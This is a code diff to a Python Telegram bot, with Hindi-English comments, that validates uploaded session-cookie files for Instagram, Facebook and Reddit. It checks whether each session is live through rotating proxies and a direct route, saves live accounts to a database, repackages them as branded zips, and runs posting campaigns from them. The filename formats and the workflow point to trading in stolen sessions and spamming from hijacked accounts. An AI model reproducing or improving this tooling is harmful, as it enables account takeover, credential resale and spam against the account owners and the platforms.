@@ -14,7 +14,7 @@ import shutil
 import tempfile
 import time
 import zipfile as _zipfile
-from typing import Dict, List, Optional
+from typing import Any, Dict, List, Optional
 
 import filetype
 import httpx
@@ -337,20 +337,20 @@ async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def _proxy_detect(u, entry: str):
     """Test both SOCKS5 and HTTP protocols against host:port and tell which works."""
-    async def probe(proxy_url: str, scheme: str):
+    async def probe(proxy_url: str):
+        cl = None
         try:
             cl = httpx.AsyncClient(proxy=proxy_url, timeout=httpx.Timeout(10.0))
-            r = await cl.get("https://api.x.com/1.1/account/verify_credentials.json")
-            if r.status_code == 200:
-                return True
-            return False
+            r = await cl.get("https://api.ipify.org?format=json")
+            return r.status_code == 200
         except Exception:
             return False
         finally:
-            await cl.aclose()
+            if cl is not None:
+                await cl.aclose()
 
-    socks_result = await probe(f"socks5://{entry}", "socks5")
-    http_result = await probe(f"http://{entry}", "http")
+    socks_result = await probe(f"socks5://{entry}")
+    http_result = await probe(f"http://{entry}")
 
     if socks_result and http_result:
         verdict = "Both SOCKS5 and HTTP work"
@@ -388,7 +388,8 @@ async def rework_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_user_rate_limit(uid):
         await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
         return
-    user_state[uid] = {"mode": "rework", "platform": None, "at": time.time()}
+    prev_live = user_state.get(uid, {}).get("live", False)
+    user_state[uid] = {"mode": "rework", "platform": None, "live": prev_live, "at": time.time()}
     await update.message.reply_text(
         "Mode = rework. Ab cookie .txt bhejo.\n"
         "Supported formats:\n"
@@ -397,7 +398,8 @@ async def rework_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  Facebook:    [37 friends] [business false] [marketplace false] [] [userid].txt\n"
         "  Reddit:      [1500 karma] [verified true] [username].txt\n"
         "  Generic:     [free] [email].txt, free data @email .txt\n\n"
-        "Output: branded zip with standard format (platform metadata included)."
+        "Output: branded zip with standard format (platform metadata included).\n"
+        f"Live check: {'ON (rework + verify)' if prev_live else 'OFF (/live on karo rework ke saath verify ke liye)'}"
     )
     await audit_log(uid, "rework_start", {})
 
@@ -407,9 +409,11 @@ async def verify_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_user_rate_limit(uid):
         await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
         return
-    user_state[uid] = {"mode": "verify", "at": time.time()}
+    user_state[uid] = {"mode": "verify", "live": True, "at": time.time()}
     await update.message.reply_text(
         "Mode = verify. Ab cookie zip bhejo.\n"
+        "Check: pehle proxy (agar configured hai), phir direct Railway IP.\n"
+        "Har route pe retries + backoff — network glitch ho to khud retry karega.\n"
         "Supported formats:\n"
         "  Instagram:   [7 followers] [2 posts] [verified false] [business false] [username].txt\n"
         "  Facebook:    [37 friends] [business false] [marketplace false] [] [userid].txt\n"
@@ -441,12 +445,14 @@ async def live_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def db_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMIN_IDS:
+    uid = update.effective_user.id
+    if uid not in ADMIN_IDS:
         await update.message.reply_text("Sirf admin.")
         return
-    if not check_user_rate_limit(update.effective_user.id):
+    if not check_user_rate_limit(uid):
         await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
         return
+
     args = context.args
     sub = args[0].lower() if args else "stats"
 
@@ -454,7 +460,7 @@ async def db_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("SUPABASE_URL / KEY set nahi.")
         return
 
-    async with httpx.AsyncClient() as cl:
+    async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as cl:
         if sub == "stats":
             fb_count = await _db.count(cl, "fb_accounts")
             ig_count = await _db.count(cl, "ig_accounts")
@@ -701,11 +707,7 @@ async def _campaign_loop(uid: int, cfg: dict, accounts: list, state: dict):
         if PROXIES:
             proxy = random.choice(PROXIES)
 
-        cl = platform_obj.http_client(proxy=proxy)
-        try:
-            check = await platform_obj.live_check(cl, ck)
-        finally:
-            await cl.aclose()
+        check = await _verify_cookie(platform_obj, ck, proxy=proxy)
 
         status = check.get("Status", "UNKNOWN")
         if status != "LIVE":
@@ -722,9 +724,14 @@ async def _campaign_loop(uid: int, cfg: dict, accounts: list, state: dict):
         if filt.get("min_followers", 0) > followers:
             return
 
-        # Post
+        # Post (fresh client — verify ke clients already closed hain)
         text = random.choice(texts)
-        ok, post_id, err = await platform_obj.post(cl, ck, safe_text(text))
+        post_proxy = proxy if check.get("via") == "proxy" else None
+        cl = platform_obj.http_client(proxy=post_proxy)
+        try:
+            ok, post_id, err = await platform_obj.post(cl, ck, safe_text(text))
+        finally:
+            await cl.aclose()
 
         if ok:
             posted_count += 1
@@ -743,7 +750,7 @@ async def _campaign_loop(uid: int, cfg: dict, accounts: list, state: dict):
                     "last_post": time.time(),
                 }
                 table = "fb_accounts" if platform == "facebook" else "ig_accounts"
-                async with httpx.AsyncClient() as db_cl:
+                async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as db_cl:
                     await _db.upsert(db_cl, table, [row])
         else:
             failed_count += 1
@@ -868,6 +875,77 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         shutil.rmtree(tmp, ignore_errors=True)
 
 
+async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], proxy: Optional[str] = None) -> Dict[str, Any]:
+    """Proxy + direct (Railway IP) dono routes se verify karo.
+
+    Har route ke andar platform-level retries (exponential backoff) chalti hain.
+    - LIVE mile to turant return.
+    - DEAD mile to turant return (cookie hi dead hai, route change ka faida nahi).
+    - Dono route fail ho to detailed reason return.
+    """
+    routes = []
+    if proxy:
+        routes.append(("proxy", platform_obj.http_client(proxy=proxy)))
+    routes.append(("direct", platform_obj.http_client()))
+
+    results = []
+    final = None
+    last_error = None
+
+    for label, cl in routes:
+        try:
+            check = await platform_obj.live_check(cl, cookies)
+        except Exception as e:
+            logger.warning("verify %s route error: %s", label, e)
+            last_error = e
+            check = {"Status": "UNKNOWN", "Reason": f"{type(e).__name__}: {str(e)[:60]}"}
+        finally:
+            await cl.aclose()
+
+        check["via"] = label
+        results.append(check)
+
+        if check.get("Status") == "LIVE":
+            return check
+        if check.get("Status") == "DEAD":
+            return check
+        final = check
+
+    if final:
+        # Dono routes UNKNOWN (network/proxy glitch) — thoda wait karke ek aur try
+        if final.get("Status") == "UNKNOWN":
+            delay = int(os.getenv("VERIFY_SLOW_RETRY_SEC", "5") or 0)
+            if delay > 0:
+                logger.info("verify: all routes UNKNOWN, slow retry in %ss", delay)
+                await asyncio.sleep(delay)
+                cl = platform_obj.http_client()
+                try:
+                    retry = await platform_obj.live_check(cl, cookies)
+                except Exception as e:  # noqa: BLE001
+                    logger.warning("verify slow retry error: %s", e)
+                    retry = None
+                finally:
+                    await cl.aclose()
+                if retry:
+                    retry["via"] = "direct-retry"
+                    results.append(retry)
+                    if retry.get("Status") in ("LIVE", "DEAD"):
+                        return retry
+                    final = retry
+
+        if len(results) > 1:
+            final["Reason"] = " | ".join(
+                f"{r.get('via')}: {r.get('Status')}/{r.get('Reason', '')}" for r in results
+            )
+        return final
+
+    return {
+        "Status": "UNKNOWN",
+        "Platform": platform_obj.NAME,
+        "Reason": f"no route tried{f' ({last_error})' if last_error else ''}",
+    }
+
+
 async def _process_one(name: str, raw: str, state: dict) -> tuple:
     """Process a single cookie file."""
     name_lower = name.lower()
@@ -885,16 +963,14 @@ async def _process_one(name: str, raw: str, state: dict) -> tuple:
     if not cookies:
         return (name, "", "no cookies")
 
-    # Live check if enabled
-    if state.get("live", False) and platform_obj:
-        cl = platform_obj.http_client()
-        try:
-            check = await platform_obj.live_check(cl, cookies)
-            status = check.get("Status", "UNKNOWN")
-            reason = check.get("Reason", "")
-            meta.update(check)
-        finally:
-            await cl.aclose()
+    # Live check if enabled — proxy + direct dono routes try hote hain
+    want_live = state.get("live", False) or state.get("mode") == "verify"
+    if want_live and platform_obj:
+        proxy = random.choice(PROXIES) if PROXIES else None
+        check = await _verify_cookie(platform_obj, cookies, proxy=proxy)
+        status = check.get("Status", "UNKNOWN")
+        reason = check.get("Reason", "")
+        meta.update(check)
     else:
         status = "UNKNOWN"
         reason = "live check off"
@@ -917,7 +993,7 @@ async def _process_one(name: str, raw: str, state: dict) -> tuple:
             "status": "live",
             "source": "bot",
         }
-        async with httpx.AsyncClient() as cl:
+        async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as cl:
             await _db.upsert(cl, table, [row])
 
     return (name, output, status)
